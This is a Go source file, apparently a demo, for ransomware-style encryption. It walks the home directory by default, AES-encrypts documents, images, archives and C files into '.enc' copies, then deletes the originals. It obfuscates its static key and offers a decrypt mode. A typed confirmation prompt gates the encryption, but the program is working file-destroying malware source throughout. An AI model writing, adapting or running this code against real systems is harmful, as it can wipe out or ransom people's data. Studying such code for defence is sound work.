//
// -*- mode: go -*-
// -*- encoding: utf8 -*-
//
package main


import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
)


var KEY string = DecodeStaticKey()
const IV string = "y0l0y0l0y0l0y0l0"

var filelist []string

func DecodeStaticKey() string {
	// "0defcon00defcon00defcon00defcon0"
	var __K [8]byte
	var __KQ string = ""

	for i := 0; i < 8; i++ {

		if i == 0 || i == 7 {
			__K[i] = '0'
		}

      		if i == 5 {
			__K[i] = 0x41 ^ 0x2e
		}

		if i == 1 {
			__K[i] = 'd'
		}

		if i == 6 {
			__K[i] = 0x6e
		}

		if i == 2 {
			__K[i] = 0x41 ^ 0x24
		}

		if i == 3 {
			__K[i] = 0xff - 0x99
		}

		if i == 4 {
			__K[i] = 'c'
		}

	}

	for i := 0; i < 4; i++ {
		__KQ += string(__K[:8])
	}

	return __KQ
}

func IsValidExtensions(ext string) bool {
	var extensions = [] string{
		".txt", ".csv", ".html", ".xml",
		".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".psd", ".rtf",
		".jpg", ".png", ".gif", ".bmp", ".pdf",
		".zip", ".tar", ".7z", ".rar",
		".c"}

	for _, curext := range extensions {
		if ext == curext {
			return true
		}
	}
	return false
}


func IsRegularFile(path string) bool {
	fi, err := os.Stat(path)
	if err != nil {
		panic(err)
	}

	return fi.Mode().IsRegular()
}


func EncryptFile(filepath string, fi os.FileInfo) bool {
	plain_data, err := ioutil.ReadFile(filepath)
	if err != nil{
		fmt.Printf("[-] ioutil.ReadFile failed: %v\n", err)
		return false
	}

	key := []byte(KEY)
	iv := []byte(IV)

	context, err := aes.NewCipher(key)
	if err != nil {
		fmt.Printf("[-] aes.NewCipher failed: %v\n", err)
		return false
	}

	filelist_data := make([]byte, len(plain_data))
	stream := cipher.NewCFBEncrypter(context, iv)
	stream.XORKeyStream(filelist_data, plain_data)

	err = ioutil.WriteFile(filepath + ".enc", filelist_data, fi.Mode())
	if err != nil{
		fmt.Printf("[-] ioutil.WriteFile failed: %v\n", err)
		return false
	}

	filelist = append(filelist, filepath)
	return true
}


func EntryFunctionEncrypt(path string, fi os.FileInfo, err error) error {

	if !IsRegularFile(path){
		return nil
	}

	current_file_extension := filepath.Ext(path)
	if current_file_extension == "" ||
		current_file_extension == ".enc" ||
		!IsValidExtensions(current_file_extension){
		 return nil
	}

	fmt.Printf("[+] Encrypting '%s'...   ", path)
	if EncryptFile(path, fi){
		fmt.Printf("Success")
	} else {
		fmt.Printf("Failed")
	}
	fmt.Print("\n")
	return nil
}



func DecryptFile(filepath string, fi os.FileInfo) bool{
	filelist_data, err := ioutil.ReadFile(filepath)
	if err != nil{
		fmt.Printf("[-] ioutil.ReadFile failed: %v\n", err)
		return false
	}

	key := []byte(KEY)
	iv := []byte(IV)

	context, err := aes.NewCipher(key)
	if err != nil {
		fmt.Printf("[-] aes.NewCipher failed: %v\n", err)
		return false
	}

	decrypted_data := make([]byte, len(filelist_data))
	stream := cipher.NewCFBDecrypter(context, iv)
	stream.XORKeyStream(decrypted_data, filelist_data)

	decrypted_filepath := filepath[:len(filepath)-4]
	err = ioutil.WriteFile(decrypted_filepath, decrypted_data, fi.Mode())
	if err != nil{
		fmt.Printf("[-] ioutil.WriteFile failed: %v\n", err)
		return false
	}

	filelist = append(filelist, filepath)
	return true
}


func EntryFunctionDecrypt(path string, fi os.FileInfo, err error) error {

	if !IsRegularFile(path){
		return nil
	}

	current_file_extension := filepath.Ext(path)
	if current_file_extension != ".enc" {
		 return nil
	}

	fmt.Printf("[+] Decrypting '%s'...   ", path)
	if DecryptFile(path, fi){
		fmt.Printf("Success\n")
	} else {
		fmt.Printf("Failed\n")
	}

	return nil
}


func AcceptSeriousWarning(path string) bool {
	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("" +
		"*****************************************************\n" +
		"                  WARNING \n" +
		"*****************************************************\n" +
		"\n" +
		"You are about to AES-encrypt all files in '%s' \n" +
		"If you're really sure type in: YES I AM SUPER SERIOUS\n" +
		"\n", path)
	text, err := reader.ReadString('\n')
	if err != nil {
		return false
	}

	return text[0:22] == "YES I AM SUPER SERIOUS"
}


func main() {
	var rootDefault string
	var err error
	if runtime.GOOS == "windows" {
		rootDefault = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
	} else {
		rootDefault = os.Getenv("HOME")
	}

	rootPtr := flag.String("root", rootDefault, "Root path to encrypt")
	doDecryptBool := flag.Bool("decrypt", false, "Switch for decryption")

	flag.Parse()

	if ( *doDecryptBool == false ){

		if AcceptSeriousWarning(*rootPtr) == false {
			fmt.Printf("[-] Bailing\n")
			return
		}

		// encrypt part
		fmt.Printf("[+] Starting encrypting from '%s'\n", *rootPtr)
		err = filepath.Walk(*rootPtr, EntryFunctionEncrypt)
		if err != nil {
			fmt.Printf("filepath.Walk() returned %v\n", err)
		}

		// delete plain files
		for _, f := range filelist {
			os.Remove(f)
		}

	} else {

		// decrypt part
		fmt.Printf("[+] Starting decrypting from '%s'\n", *rootPtr)
		err = filepath.Walk(*rootPtr, EntryFunctionDecrypt)
		if err != nil {
			fmt.Printf("filepath.Walk() returned %v\n", err)
		}

		// delete encrypted files
		for _, f := range filelist {
			os.Remove(f)
		}

	}

}
